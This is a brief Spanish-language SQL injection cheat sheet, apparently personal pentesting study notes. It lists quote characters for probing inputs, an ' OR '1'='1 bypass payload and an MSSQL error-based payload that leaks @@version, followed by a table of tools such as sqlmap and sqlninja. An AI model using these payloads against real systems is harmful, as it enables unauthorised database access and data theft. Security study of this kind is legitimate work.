
## Inyeccion
Parseo para inyectar la secuencia puede ser

	➡️ username'
	➡️ username""
	➡️ username`

## Comprobaciones rapidas 

	-username' OR '1'='1

## Verificación de la versiones

	- username' AND 1=convert(int,@@version)--


## Herramientas

| Tool          | Description                  | Primary Use Case                 |
| ------------- | ---------------------------- | -------------------------------- |
| [[SQLMAP]]    | Automated SQL injection tool | Discovery and exploitation       |
| [[BURPSUITE]] | Web vulnerability scanner    | Traffic interception and testing |
| DBeaver       | Database management          | Post-exploitation analysis       |
| HeidiSQL      | Database client              | Database interaction             |
| sqlninja      | MSSQL exploitation tool      | Advanced exploitation            |
